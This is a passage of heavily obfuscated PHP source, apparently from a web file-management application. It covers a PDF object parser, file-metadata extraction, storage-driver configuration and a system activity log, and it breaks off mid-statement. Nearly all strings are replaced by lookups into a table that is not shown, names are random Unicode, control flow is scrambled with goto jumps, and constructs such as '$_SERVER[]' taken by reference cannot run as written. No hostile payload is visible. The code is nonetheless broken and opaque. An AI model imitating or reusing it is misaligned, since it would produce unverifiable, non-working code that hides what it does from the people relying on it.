$Bׅȱ = strcspn($cݐ, $d[1558], $FˮÂ); if ($Bׅȱ > 0) { $FˮÂ += $Bׅȱ; return self::getRawObject($cݐ, $FˮÂ); } break; case $d[8]: $a˞ӳ = $cĔ; ++$FˮÂ; $e߇ = preg_match($d[1559], substr($cݐ, $FˮÂ, 256), $c⏏); if (1 == $e߇) { $C򃡭 = $c⏏[1]; $FˮÂ += strlen($C򃡭); } break; case $d[244]: case $d[803]: $a˞ӳ = $cĔ; ++$FˮÂ; $DƱ = $FˮÂ; if ($d[244] == $cĔ) { $CŤ = 1; while ($CŤ > 0) { if (!isset($cݐ[$DƱ])) { break; } $EΜ = $cݐ[$DƱ]; switch ($EΜ) { case $d[93]: ++$DƱ; break; case $d[244]: ++$CŤ; break; case $d[803]: --$CŤ; break; } ++$DƱ; } $C򃡭 = substr($cݐ, $FˮÂ, $DƱ - $FˮÂ - 1); $FˮÂ = $DƱ; } break; case $d[153]: case $d[472]: $a˞ӳ = $cĔ; ++$FˮÂ; if ($d[153] == $cĔ) { $C򃡭 = array(); do { $EԎ = $FˮÂ; $C = self::getRawObject($cݐ, $FˮÂ); $FˮÂ = $C[2]; $C򃡭[] = $C; } while ($d[472] != $C[0] && $FˮÂ != $EԎ); array_pop($C򃡭); } break; case $d[911]: case $d[914]: if (isset($cݐ[$FˮÂ + 1]) && $cݐ[$FˮÂ + 1] == $cĔ) { $a˞ӳ = $cĔ . $cĔ; $FˮÂ += 2; if ($d[911] == $cĔ) { $C򃡭 = array(); do { $EԎ = $FˮÂ; $C = self::getRawObject($cݐ, $FˮÂ); $FˮÂ = $C[2]; $C򃡭[] = $C; } while ($d[1560] != $C[0] && $FˮÂ != $EԎ); array_pop($C򃡭); } } else { $a˞ӳ = $cĔ; ++$FˮÂ; $e߇ = preg_match($d[1561], substr($cݐ, $FˮÂ), $c⏏); if ($d[911] == $cĔ && 1 == $e߇) { $C򃡭 = strtr($c⏏[1], $d[1562], $d[33]); $FˮÂ += \strlen($c⏏[0]); } elseif (!1 !== ($d = strpos($cݐ, $d[914], $FˮÂ))) { $FˮÂ = $d + 1; } } break; default: if ($d[1563] == substr($cݐ, $FˮÂ, 6)) { $a˞ӳ = $d[1563]; $FˮÂ += 6; } elseif ($d[99] == substr($cݐ, $FˮÂ, 4)) { $a˞ӳ = $d[99]; $FˮÂ += 4; $C򃡭 = $d[99]; } elseif ($d[1564] == substr($cݐ, $FˮÂ, 4)) { $a˞ӳ = $d[1565]; $FˮÂ += 4; $C򃡭 = $d[1564]; } elseif ($d[1566] == substr($cݐ, $FˮÂ, 5)) { $a˞ӳ = $d[1565]; $FˮÂ += 5; $C򃡭 = $d[1566]; } elseif ($d[1567] == substr($cݐ, $FˮÂ, 6)) { $a˞ӳ = $d[1567]; $FˮÂ += 6; if (1 == preg_match($d[1568], substr($cݐ, $FˮÂ), $c⏏)) { $FˮÂ += strlen($c⏏[0]); $fĕ = $d[1569]; $e߇ = preg_match($fĕ, substr($cݐ, $FˮÂ), $c⏏, PREG_OFFSET_CAPTURE); if (1 == $e߇) { $C򃡭 = substr($cݐ, $FˮÂ, $c⏏[0][1]); $FˮÂ += $c⏏[1][1]; } } } elseif ($d[1570] == substr($cݐ, $FˮÂ, 9)) { $a˞ӳ = $d[1570]; $FˮÂ += 9; } elseif (1 == preg_match($d[1571], substr($cݐ, $FˮÂ, 33), $c⏏)) { $a˞ӳ = $d[1533]; $FˮÂ += strlen($c⏏[0]); $C򃡭 = intval($c⏏[1]) . $d[70] . intval($c⏏[2]); } elseif (1 == preg_match($d[1572], substr($cݐ, $FˮÂ, 33), $c⏏)) { $a˞ӳ = $d[1573]; $C򃡭 = intval($c⏏[1]) . $d[70] . intval($c⏏[2]); $FˮÂ += strlen($c⏏[0]); } elseif (($a܍ = strspn($cݐ, $d[1574], $FˮÂ)) > 0) { $a˞ӳ = $d[1575]; $C򃡭 = substr($cݐ, $FˮÂ, $a܍); $FˮÂ += $a܍; } break; } goto fӆ㖋; Cٝٷ: } } class GetInfo { private static $fileTypeArray; public static function get($E) { $f𺬾 = IO::info($E); return self::infoAdd($f𺬾); } public static function infoAdd(&$a֓) { goto Eƃ; Eƃ: $Cߧ =& $_SERVER[]; static $a캖ѷ; if (!$a캖ѷ) { require SDK_DIR . $Cߧ[1576]; $a캖ѷ = new getID3(); } goto cʆ; Aƿ: $Aݠ[$Cߧ[368]] = $DҎ; $a֓[$Cߧ[422]] = $Aݠ; return $a֓; goto f; cʆ: if (!$a֓ || $a֓[$Cߧ[29]] != $Cߧ[163]) { return; } if (!self::support($a֓[$Cߧ[156]]) || isset($a֓[$Cߧ[422]])) { return; } $D׸ů = $Cߧ[1577] . $a֓[$Cߧ[75]]; goto e; e: $DҎ = $a֓[$Cߧ[156]]; try { if ($a֓[$Cߧ[156]] == $Cߧ[1578]) { $Aݠ = self::psdParse($D׸ů); $DҎ = $Cߧ[1579]; } else { if ($a֓[$Cߧ[156]] == $Cߧ[1580]) { $Aݠ = self::pdfParse($D׸ů); } else { $DҎ = self::$fileTypeArray[$Cߧ[1581]][$a֓[$Cߧ[156]]]; $fƸ = self::$fileTypeArray[$Cߧ[1582]][$DҎ][$Cߧ[1583]]; $a = @$a캖ѷ->analyze($D׸ů, $a֓[$Cߧ[77]], $a֓[$Cߧ[28]]); $Aݠ = self::parseData($a, $fƸ, $a֓); } } } catch (Exception $aӲ) { $Aݠ = array($Cߧ[368] => $DҎ); } if (!$Aݠ) { return; } goto Aƿ; f: } public static function support($f) { goto f; f: $c۟ =& $_SERVER[]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $f = strtolower($f); goto A; b󯖑: return !1; goto F; A: $C = array($c۟[1580], $c۟[1578]); if (in_array($f, $C)) { return !0; } if (isset(self::$fileTypeArray[$c۟[1581]][$f])) { return !0; } goto b󯖑; F: } private static function parseData($D, $eΡ, $Aԋ) { $e =& $_SERVER[]; $fÐ = $D[$e[1584]]; $fݬ = array(); foreach ($eΡ as $b뽒¡ => $B۔) { foreach ($B۔ as $Fڋ) { if (is_array($Fڋ)) { $D = self::parseData($D, $B۔, $Aԋ); if ($D) { $fݬ[$b뽒¡] = $D; } break; } $C剣 = str_replace($e[1359], $fÐ, $Fڋ); $D = _get($D, $C剣); $D = is_array($D) ? $D[0] : $D; if ($D) { break; } } if ($D || $D === 0 || $D === !1) { $D = self::valueReset($Fڋ, $D, $b뽒¡); if ($D !== null) { $fݬ[$b뽒¡] = $D; } } } $fݬ = self::valueResetAll($fݬ, $Aԋ); return $fݬ; } private static function psdParse($aݜ) { $eѓ =& $_SERVER[]; if (IO::fileSubstr($aݜ, 0, 4) != $eѓ[1585]) { return !1; } $f񿊍 = getImageSize($aݜ, $F綑); if (!$f񿊍) { return; } $EԪ = array($eѓ[1500] => $f񿊍[0], $eѓ[1502] => $f񿊍[1]); return $EԪ; } private static function pdfParse($b㥘ݷ) { return FileParsePdf::parse($b㥘ݷ); } private static function fileTypeParse() { $a獠 =& $_SERVER[]; $E = self::fileTypeArray(); $D᫽݆ = array(); foreach ($E as $Cމ => $CƎ) { $c = _get($CƎ, $a獠[156], $a獠[33]); $Fޡɩ = is_string($c) ? explode($a獠[47], $c) : $c; if (!$Fޡɩ) { continue; } foreach ($Fޡɩ as $c) { $c = strtolower(trim($c)); if (!$c) { continue; } $D᫽݆[$c] = $Cމ; } $E[$Cމ][$a獠[156]] = array_keys($D᫽݆); $E[$Cމ][$a獠[1583]] = self::parseKeyMap($CƎ[$a獠[1583]]); } return array($a獠[1582] => $E, $a獠[1581] => $D᫽݆); } private static function parseKeyMap($A) { $BĮ =& $_SERVER[]; foreach ($A as $Eڴ => $AȾ) { if (is_array($AȾ)) { $Bȼ = self::parseKeyMap($AȾ); if ($Bȼ) { $A[$Eڴ] = $Bȼ; } continue; } $f = explode($BĮ[47], $AȾ); $e = array(); foreach ($f as $D) { $D = trim($D); if (!$D) { continue; } if (preg_match($BĮ[1586], $D, $f)) { $eȊ = explode($BĮ[267], $f[1]); foreach ($eȊ as $B踆) { $e[] = str_replace($f[0], $B踆, $D); } } else { $e[] = $D; } } $A[$Eڴ] = $e; } return $A; } private static function valueResetAll($aæ, $e) { goto B뗬آ; Bʞ: return $aæ; goto d; B뗬آ: $Fೡ =& $_SERVER[]; if (isset($aæ[$Fೡ[1587]])) { $dƭ = ceil($aæ[$Fೡ[1587]]); $fʅϜ = intval($dƭ / 3600); $Dӑל = intval(($dƭ - $fʅϜ * 3600) / 60); $b󛛙 = $dƭ % 60; $aæ[$Fೡ[1588]] = sprintf($Fೡ[1589], $fʅϜ, $Dӑל, $b󛛙); if ($fʅϜ == 0) { $aæ[$Fೡ[1588]] = sprintf($Fೡ[1590], $Dӑל, $b󛛙); } } $e = _get($aæ, $Fೡ[1591]); goto Fƒʚ; Fƒʚ: if ($e) { $bڪ = IO_PATH_SYSTEM_TEMP . $Fೡ[1592] . KodIO::hashPath($e) . $Fೡ[1593]; $aæ[$Fೡ[1594]] = Action($Fೡ[1595])->pluginCacheFileSet($bڪ, $e); unset($aæ[$Fೡ[1596]][$Fೡ[1579]]); } $BՍ = _get($aæ, $Fೡ[1597], $Fೡ[33]); $Fۮ苛 = _get($aæ, $Fೡ[1598], $Fೡ[33]); goto e; e: $DɎ = _get($aæ, $Fೡ[1599], $Fೡ[33]); $Dں = $BՍ . $Fۮ苛 . $DɎ; if ($Dں && get_charset($Dں) != $Fೡ[322]) { $aæ[$Fೡ[1596]][$Fೡ[1313]] = iconv_to($aæ[$Fೡ[1596]][$Fೡ[1313]], get_charset($Dں), $Fೡ[322]); $aæ[$Fೡ[1596]][$Fೡ[1600]] = iconv_to($aæ[$Fೡ[1596]][$Fೡ[1600]], get_charset($Dں), $Fೡ[322]); $aæ[$Fೡ[1596]][$Fೡ[1601]] = iconv_to($aæ[$Fೡ[1596]][$Fೡ[1601]], get_charset($Dں), $Fೡ[322]); } goto Bʞ; d: } private static function valueReset($eΜ, $A, $D) { $Fы =& $_SERVER[]; $fŠ = $Fы[1517]; switch ($eΜ) { case $Fы[1602]: $A = $A == $Fы[83] ? $Fы[1603] : $Fы[1604]; break; case $Fы[1605]: $A = $A ? $A : null; break; default: break; } switch ($D) { case $Fы[1606]: $A = round($A, 2); break; case $Fы[183]: case $Fы[106]: if ($A < 0) { $A = null; } else { if (is_numeric($A)) { $A = date($fŠ, $A); } } break; default: break; } return $A; } private static function fileTypeArray() { $B񰌦 =& $_SERVER[]; return array($B񰌦[1579] => array($B񰌦[156] => $B񰌦[1607] . $B񰌦[1608], $B񰌦[1583] => array($B񰌦[1500] => $B񰌦[1609], $B񰌦[1502] => $B񰌦[1610], $B񰌦[1611] => $B񰌦[1612], $B񰌦[1613] => $B񰌦[1614], $B񰌦[183] => $B񰌦[1615], $B񰌦[106] => $B񰌦[1616], $B񰌦[1617] => $B񰌦[1618], $B񰌦[1619] => $B񰌦[1620], $B񰌦[1621] => $B񰌦[1622], $B񰌦[1623] => $B񰌦[1624], $B񰌦[1625] => $B񰌦[1626], $B񰌦[1627] => $B񰌦[1628], $B񰌦[1629] => $B񰌦[1630], $B񰌦[1631] => array($B񰌦[1632] => $B񰌦[1633], $B񰌦[1634] => $B񰌦[1635], $B񰌦[1636] => $B񰌦[1637]), $B񰌦[1638] => $B񰌦[1639], $B񰌦[1640] => $B񰌦[1641], $B񰌦[1642] => $B񰌦[1643], $B񰌦[1644] => $B񰌦[1645], $B񰌦[1646] => array($B񰌦[1647] => $B񰌦[1648], $B񰌦[1649] => $B񰌦[1650], $B񰌦[1651] => $B񰌦[1652], $B񰌦[1653] => $B񰌦[1654], $B񰌦[1655] => $B񰌦[1656], $B񰌦[1657] => $B񰌦[1658], $B񰌦[1659] => $B񰌦[1660], $B񰌦[1661] => $B񰌦[1662], $B񰌦[1663] => $B񰌦[1664], $B񰌦[1665] => $B񰌦[1666], $B񰌦[1667] => $B񰌦[1668]))), $B񰌦[1669] => array($B񰌦[156] => $B񰌦[1670] . $B񰌦[1671], $B񰌦[1583] => array($B񰌦[1587] => $B񰌦[1672], $B񰌦[183] => $B񰌦[1673], $B񰌦[106] => $B񰌦[1674], $B񰌦[1619] => $B񰌦[1675], $B񰌦[1676] => $B񰌦[1677], $B񰌦[1678] => $B񰌦[1605], $B񰌦[1679] => $B񰌦[1680], $B񰌦[1681] => $B񰌦[1682], $B񰌦[1683] => $B񰌦[1684], $B񰌦[1596] => array($B񰌦[1313] => $B񰌦[1685], $B񰌦[1600] => $B񰌦[1686], $B񰌦[1601] => $B񰌦[1687], $B񰌦[1688] => $B񰌦[1689], $B񰌦[1690] => $B񰌦[1691], $B񰌦[1692] => $B񰌦[1693], $B񰌦[1579] => $B񰌦[1694]))), $B񰌦[1695] => array($B񰌦[156] => $B񰌦[1696] . $B񰌦[1697], $B񰌦[1583] => array($B񰌦[1500] => $B񰌦[1698], $B񰌦[1502] => $B񰌦[1699], $B񰌦[1587] => $B񰌦[1672], $B񰌦[183] => $B񰌦[1700], $B񰌦[106] => $B񰌦[1701], $B񰌦[1606] => $B񰌦[1702], $B񰌦[1683] => $B񰌦[1703], $B񰌦[1679] => $B񰌦[1704], $B񰌦[1619] => $B񰌦[1705], $B񰌦[1669] => array($B񰌦[1678] => $B񰌦[1605], $B񰌦[1706] => $B񰌦[1707], $B񰌦[1676] => $B񰌦[1677], $B񰌦[1683] => $B񰌦[1684], $B񰌦[1679] => $B񰌦[1708], $B񰌦[1681] => $B񰌦[1682]))), $B񰌦[1709] => array($B񰌦[1583] => array($B񰌦[1710] => $B񰌦[1711], $B񰌦[1712] => $B񰌦[1713])), $B񰌦[1714] => array($B񰌦[1583] => array())); } } goto eα; BꝪފ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x73\164\x6f\x72\x61\x67\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\155\145", "\x73\151\x7a\x65\115\141\x78", "\x73\x79\163\164\x65\x6d", "\144\x65\x66\141\165\154\164", "\144\x72\151\166\x65\162", "\x63\x6f\156\x66\151\147"); public function listData($B = false, $E팩 = "\155\157\144\151\x66\171\124\151\155\x65", $eŦ = false) { goto bɴ; Eᔆ: foreach ($eҺ as $eҴ => $cǘѺ) { unset($eҺ[$eҴ][$D܆[6]]); $eҺ[$eҴ][$D܆[2054]] = 0; } $dɅ = array_to_keyvalue($eҺ, $D܆[33], $D܆[363]); $this->_listAppendSize($eҺ, $dɅ); goto f댢ˉ; f댢ˉ: return $eҺ; goto D; bɴ: $D܆ =& $_SERVER[]; $eҺ = parent::listData($B, $E팩, $eŦ); if ($B) { return $eҺ; } goto Eᔆ; D: } public function _listAppendSize(&$Dݘ, $bԗ߃) { $e =& $_SERVER[]; $d亱 = $e[2328] . implode($e[47], $bԗ߃) . $e[2329]; $A = Model($e[705])->query($d亱); $A = array_to_keyvalue($A, $e[363], $e[77]); foreach ($Dݘ as $dԅ他 => $Bڬ) { $Dݘ[$dԅ他][$e[2054]] = isset($A[$Bڬ[$e[363]]]) ? $A[$Bڬ[$e[363]]] : 0; } } public function getConfig($fì) { $b = parent::listData($fì); return json_decode($b[$_SERVER[][6]], !0); } public function update($AҎ, $E) { goto f; f: $C⪹ =& $_SERVER[]; $E׷ = $E[$C⪹[28]]; $aࠟ = array_to_keyvalue(parent::listData(), $C⪹[28]); goto cϽ; Cꇷ: $Eґ = parent::update($AҎ, $E); if ($Eґ && $E[$C⪹[34]]) { foreach ($aࠟ as $aĴ) { if ($aĴ[$C⪹[34]] && $aĴ[$C⪹[363]] != $AҎ) { parent::update($aĴ[$C⪹[363]], array($C⪹[34] => 0)); } } } return $Eґ; goto Bư; cϽ: if (isset($aࠟ[$E׷]) && $aࠟ[$E׷][$C⪹[363]] != $AҎ) { return !1; } if (isset($E[$C⪹[2330]]) && $E[$C⪹[2330]] == $C⪹[83]) { $this->checkConfig($E); } unset($E[$C⪹[2330]]); goto Cꇷ; Bư: } public function add($D) { goto bܝ; BΏ: $this->checkConfig($D); $Aʪӻ = parent::insert($D); if ($Aʪӻ && $D[$Aͳ[34]]) { foreach ($D as $bؓ) { if ($bؓ[$Aͳ[34]]) { parent::update($bؓ[$Aͳ[363]], array($Aͳ[34] => 0)); } } } goto F뢿; bܝ: $Aͳ =& $_SERVER[]; $D = array_to_keyvalue(parent::listData(), $Aͳ[28]); if (isset($D[$D[$Aͳ[28]]])) { return !1; } goto BΏ; F뢿: return $Aʪӻ; goto B­; B­: } public function checkConfig(&$eͯ) { goto FË; FË: $Aֈ =& $_SERVER[]; $E = strtolower($eͯ[$Aֈ[90]]); $eϳ = json_decode($eͯ[$Aֈ[6]], !0); goto CΠ; e綉: $dҤ = $c݅ǚ->getPath($CÑ . $Aֈ[1950]); if (!$c݅ǚ->mkfile($dҤ)) { show_json(LNG($Aֈ[2331]), !1); } $eϳ[$Aֈ[1011]] = $CÑ; goto c; aˎկ: $D = $Aֈ[71] . $Fū; $c݅ǚ = new $D($eϳ); if (in_array($E, $c݅ǚ->objectDriver)) { if (!$c݅ǚ->isBucketCors() && !$c݅ǚ->setBucketCors()) { $b = LNG($Aֈ[2331]); $b .= $Aֈ[2332] . LNG($Aֈ[2333]); show_json($b, !1); } } goto e綉; CΠ: foreach ($eϳ as $a => $D) { $eϳ[$a] = trim($D); } $CÑ = rtrim($eϳ[$Aֈ[1011]], $Aֈ[8]) . $Aֈ[8]; $Fū = $this->driverType($E); goto aˎկ; c: $eͯ[$Aֈ[6]] = json_encode($eϳ); $eͯ[$Aֈ[90]] = $Fū; return !0; goto fӃ; fӃ: } private function driverType($eɆ) { $Bॢ =& $_SERVER[]; $fش = array($Bॢ[101] => $Bॢ[2334], $Bॢ[58] => $Bॢ[2335], $Bॢ[64] => $Bॢ[2336]); if (isset($fش[$eɆ])) { return $fش[$eɆ]; } return strtoupper($eɆ); } public function driverListSystem() { $eͧ =& $_SERVER[]; $c = parent::listData(); $b˭ = array(); foreach ($c as $d) { unset($d[$eͧ[183]], $d[$eͧ[106]]); $d[$eͧ[6]] = json_decode($d[$eͧ[6]], !0); $b˭[] = $d; } return $b˭; } public function defaultDriver() { $e彌 =& $_SERVER[]; $f݃ = parent::listData(); $Cו = array_filter_by_field($f݃, $e彌[34], 1); $Cו = $Cו[0]; if ($Cו) { $Cו[$e彌[6]] = json_decode($Cו[$e彌[6]], !0); } return $Cו; } public function driverInfo($Cĩ) { $CɐƋ =& $_SERVER[]; $E = array_to_keyvalue(parent::listData(), $CɐƋ[363]); if (!isset($E[$Cĩ])) { return !1; } $bС = $E[$Cĩ]; $bС[$CɐƋ[6]] = json_decode($bС[$CɐƋ[6]], !0); return $bС; } public function remove($dȅǊ) { $this->removeShareItems($dȅǊ); return parent::remove($dȅǊ); } public function removeWithFile($F) { goto b; dĪ: if (!$Fķ) { $cǰ->stop($E); return !1; } $cǰ->end(); $this->remove($F); goto aྖͨ; cƃ: $f٪Ҩ = Model($B[418])->where($eޔ)->sum($B[77]); $E = $B[2337] . $F; $cǰ = new TaskFileTransfer($E, $B[2338], $D䴥ݽ, LNG($B[2339]) . "\50{$F}\x29"); goto bû; cۘ٭: $dɳ = "\x7b\x69\157\72{$a}\x7d\57"; $Fķ = !0; $e潝 = array(); goto Eϻԓ; b: $B =& $_SERVER[]; $eޔ = array($B[729] => $F); $D䴥ݽ = Model($B[418])->where($eޔ)->count(); goto cƃ; Eϻԓ: $a = Model($B[163])->where($eޔ)->field($B[2340])->select(); foreach ($a as $A꾶ؑ) { goto a; fݱ: $fʰ = array($B[729] => $a, $B[75] => $eū); Model($B[163])->where($eޔ)->save($fʰ); goto Eׄ; dՔ: if (IO::exist($eū)) { $cǰ->updateFileEnd($A꾶ؑ[$B[28]], $A꾶ؑ[$B[77]]); continue; } if (!IO::move($Bԕ, get_path_father($eū))) { $Fķ = !1; break; } $eޔ = array($B[415] => $A꾶ؑ[$B[415]]); goto fݱ; a: $Bԕ = $A꾶ؑ[$B[75]]; $eū = $dɳ . str_replace("\x7b\x69\x6f\72{$F}\x7d\57", $B[33], $Bԕ); if (!IO::exist($Bԕ)) { $e潝[] = $A꾶ؑ[$B[415]]; $cǰ->updateFileEnd($A꾶ؑ[$B[28]], $A꾶ؑ[$B[77]]); continue; } goto dՔ; Eׄ: } $this->removeByFileID($e潝); goto dĪ; bû: $cǰ->task[$B[684]] = (double) $f٪Ҩ; $e낙 = KodIO::defaultDriver(); $a = $e낙[$B[363]]; goto cۘ٭; aྖͨ: } public function progress($aϊԔ) { return Task::get($_SERVER[][2337] . $aϊԔ); } private function removeByFileID($bȏ = array()) { goto b; fܐ: $E = Model($E[1097])->where($bˤﲌ)->field($E[365])->select(); if (!$E) { return; } $E = array_to_keyvalue($E, $E[33], $E[365]); goto Eщ; b: $E =& $_SERVER[]; if (empty($bȏ)) { return; } $bˤﲌ = array($E[415] => array($E[7], $bȏ)); goto fܐ; Eщ: foreach ($E as $cϊТ) { Model($E[378])->removeNow($cϊТ, !1); } goto cӯے; cӯے: } private function removeShareItems($b) { goto bľџ; Cφ: $CǍچ = Model($a[2045])->where($E褯)->field($a[437])->select(); if (empty($CǍچ)) { return; } $A͗ = array_to_keyvalue($CǍچ, $a[33], $a[437]); goto C̫; C̫: Model($a[532])->remove($A͗); goto c; bľџ: $a =& $_SERVER[]; $D饈֯ = "\x7b\151\157\72{$b}\x7d\57"; $E褯 = array($a[365] => 0, $a[1005] => array($a[737], "{$D饈֯}\x25")); goto Cφ; c: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\114\x69\147\x68\164\101\160\x70"; public $modelType = "\x53\171\163\164\145\155\117\x70\164\x69\157\156"; public $field = array("\x6e\141\x6d\145", "\x67\x72\x6f\x75\x70", "\144\x65\x73\143", "\x63\157\156\164\145\x6e\x74"); public function listData($B = false, $D = "\155\x6f\x64\x69\146\171\124\x69\155\145", $a = true) { return parent::listData($B, $D, $a); } public function remove($B޴) { $F򔅇 = $this->findByName($B޴); if (!$F򔅇) { return !1; } return parent::remove($F򔅇[$_SERVER[][363]]); } public function add($D҅) { if ($this->findByName($D҅[$_SERVER[][28]])) { return !1; } return parent::insert($D҅); } public function update($Aή, $A) { $EБŋ =& $_SERVER[]; $F = $this->findByName($Aή); $e先 = $this->findByName($A[$EБŋ[28]]); if (!$F || $e先 && $e先[$EБŋ[363]] != $F[$EБŋ[363]]) { return !1; } return parent::update($F[$EБŋ[363]], $A); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\x6d\137\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\x69\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\162\164", "\x66\x75\156\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $A٠߆ =& $_SERVER[]; return array($A٠߆[2341] => LNG($A٠߆[2342]), $A٠߆[2343] => LNG($A٠߆[2344]), $A٠߆[2008] => LNG($A٠߆[2345]), $A٠߆[2346] => LNG($A٠߆[2347]), $A٠߆[2348] => LNG($A٠߆[2349]), $A٠߆[2350] => LNG($A٠߆[2351]), $A٠߆[2352] => LNG($A٠߆[2353]), $A٠߆[2354] => LNG($A٠߆[2355]), $A٠߆[2039] => LNG($A٠߆[2356]), $A٠߆[2040] => LNG($A٠߆[2357]), $A٠߆[2358] => LNG($A٠߆[2359]), $A٠߆[2360] => LNG($A٠߆[2361]), $A٠߆[2362] => LNG($A٠߆[2363]), $A٠߆[2364] => LNG($A٠߆[2365]), $A٠߆[2037] => LNG($A٠߆[2366]), $A٠߆[2043] => LNG($A٠߆[2367]), $A٠߆[2368] => LNG($A٠߆[2369]), $A٠߆[2370] => LNG($A٠߆[2371]), $A٠߆[2372] => LNG($A٠߆[2373]), $A٠߆[2374] => LNG($A٠߆[2375]), $A٠߆[2046] => LNG($A٠߆[2376]), $A٠߆[2047] => LNG($A٠߆[2377]), $A٠߆[2378] => LNG($A٠߆[2379]), $A٠߆[2380] => LNG($A٠߆[2381]), $A٠߆[2382] => LNG($A٠߆[2383]), $A٠߆[2384] => LNG($A٠߆[2385]), $A٠߆[2386] => LNG($A٠߆[2387]), $A٠߆[2041] => LNG($A٠߆[2388]), $A٠߆[2389] => LNG($A٠߆[2390]), $A٠߆[2391] => LNG($A٠߆[2392]), $A٠߆[2393] => LNG($A٠߆[2393]), $A٠߆[2394] => LNG($A٠߆[2012]), $A٠߆[2395] => LNG($A٠߆[2396]), $A٠߆[2397] => LNG($A٠߆[2398]), $A٠߆[2399] => LNG($A٠߆[2400]), $A٠߆[2401] => LNG($A٠߆[2402]), $A٠߆[2403] => LNG($A٠߆[2404]), $A٠߆[2405] => LNG($A٠߆[2405]), $A٠߆[2406] => LNG($A٠߆[2407]), $A٠߆[2408] => LNG($A٠߆[2409]), $A٠߆[2410] => LNG($A٠߆[2411]), $A٠߆[2412] => LNG($A٠߆[2413]), $A٠߆[2414] => LNG($A٠߆[2415]), $A٠߆[2416] => LNG($A٠߆[2417])); } private function typeFile() { $d˵ =& $_SERVER[]; $C = array($d˵[2043] => array($d˵[2044]), $d˵[2362] => array($d˵[2418]), $d˵[2364] => array($d˵[2419]), $d˵[2037] => array($d˵[2038]), $d˵[2370] => array(), $d˵[2372] => array(), $d˵[2374] => array(), $d˵[2046] => array($d˵[2048]), $d˵[2047] => array($d˵[2048]), $d˵[2378] => array($d˵[2420]), $d˵[2380] => array($d˵[2420]), $d˵[2382] => array($d˵[2421]), $d˵[2368] => array($d˵[2422]), $d˵[2384] => array($d˵[2423]), $d˵[2386] => array($d˵[2424]), $d˵[2041] => array($d˵[2042])); return $C; } private function typeAll() { goto fñ; DŲȤ: foreach ($CЯ as $d => $bʼ) { $B݌Ӣ[$bʼ[0]] = $B݌Ӣ[$d]; } $B݌Ӣ[$Dۣ[2048]] = LNG($Dۣ[2425]); $B݌Ӣ[$Dۣ[2420]] = LNG($Dۣ[2426]); goto Aڒ; fñ: $Dۣ =& $_SERVER[]; $B݌Ӣ = $this->typeList; $CЯ = array_filter($this->typeFile()); goto DŲȤ; Aڒ: return $B݌Ӣ; goto Eʮ; Eʮ: } public function addLog($E䊮, $CҴĆ = array()) { goto Dޅ; cɲË: $A惃ڿ = get_client_ip(); if (!$CҴĆ || strlen(json_encode($CҴĆ)) >= 1024) { $CҴĆ = array($eՖ[2427] => $A惃ڿ); } else { if (is_array($CҴĆ)) { $CҴĆ[$eՖ[2427]] = $A惃ڿ; } else { $CҴĆ = array($eՖ[1021] => $CҴĆ, $eՖ[2427] => $A惃ڿ); } } $CҴĆ = array($eՖ[1396] => Session::sign(), $eՖ[1397] => $B, $eՖ[29] => $E䊮, $eՖ[1399] => json_encode($CҴĆ)); goto a; Dޅ: $eՖ =& $_SERVER[]; if (!isset($this->typeList[$E䊮])) { return; } $B = USER_ID ? USER_ID : (isset($CҴĆ[$eՖ[1406]]) ? $CҴĆ[$eՖ[1406]] : 0); goto cɲË; a: parent::add($CҴĆ); goto fڲ; fڲ: } public function remove($d) { $this->where(array($_SERVER[][381] => $d))->delete(); } private function _makeOrder($a霢 = '') { goto aˌ; F: return $this->order($a霢); goto f; aˌ: $bω =& $_SERVER[]; $aמ = $bω[183]; $A̍ = array($bω[398] => $bω[399], $bω[400] => $bω[401]); goto e澑޹; e澑޹: $BՉǭ = Input::get($bω[404], $bω[7], $bω[2206], array($bω[2143], $bω[400])); $BՉǭ = $A̍[$BՉǭ]; $a霢 = $a霢 . "{$aמ}\x20{$BՉǭ}"; goto F; f: } public function get($E = '') { goto f; cϡИ: $Aʚ[$CҢ[350]] = $this->logList($Aʚ[$CҢ[350]]); return $Aʚ; goto Cׄ; f: $CҢ =& $_SERVER[]; if (!$E) { show_json(array()); } $C֙ = array(); goto aΙ; BĽҒ: if (!empty($E[$CҢ[2427]])) { $C֙[$CҢ[401]] = array($CҢ[737], "\45{$E[$CҢ[2427]]}\x25"); } $Aʚ = $this->_makeOrder()->where($C֙)->selectPage(); if (empty($Aʚ[$CҢ[350]])) { show_json(array(), !0, $Aʚ[$CҢ[347]]); } goto cϡИ; aΙ: if ($E[$CҢ[1406]]) { $C֙[$CҢ[1406]] = $E[$CҢ[1406]]; } if (isset($E[$CҢ[688]])) { $Eć = $E[$CҢ[688]]; $cʉ = isset($E[$CҢ[689]]) ? $E[$CҢ[689]] : time(); $C֙[$CҢ[183]] = array($CҢ[317], array($Eć, $cʉ)); } if ($E[$CҢ[29]]) { $aǿ = explode($CҢ[47], $E[$CҢ[29]]); $Dʕ = $this->typeFile(); $f۔ = array(); foreach ($aǿ as $cǵ) { $f۔[] = $cǵ; if (isset($Dʕ[$cǵ])) { $f۔ = array_merge($f۔, $Dʕ[$cǵ]); } } $f۔ = array_unique($f۔); if ($f۔) { $C֙[$CҢ[29]] = array($CҢ[7], $f۔); } } goto BĽҒ; Cׄ: } private function ipAddress(&$Eȴ) { $Eǖ =& $_SERVER[]; if (!empty($Eȴ[$Eǖ[2427]])) { $ĉў = IpLocation::get($Eȴ[$Eǖ[2427]]); if ($ĉў == $Eǖ[2428]) { $ĉў = $Eǖ[2429]; } } else { $ĉў = LNG($Eǖ[2430]); } $Eȴ[$Eǖ[2431]] = $ĉў; } private function descZipDownload($aȇ, &$b) { $e橚 =& $_SERVER[]; if (!isset($aȇ[$e橚[2432]])) { return; } $aë = json_decode($aȇ[$e橚[2432]], !0); foreach ($aë as $FɄ) { if (!IO::init($FɄ[$e橚[75]])) { continue; } if (!($Eٌ = IO::infoFull($FɄ[$e橚[75]]))) { continue; } $aȇ[$e橚[75]] = $FɄ[$e橚[75]]; $b[] = $aȇ[$e橚[365]] = $Eٌ[$e橚[365]]; $b[] = 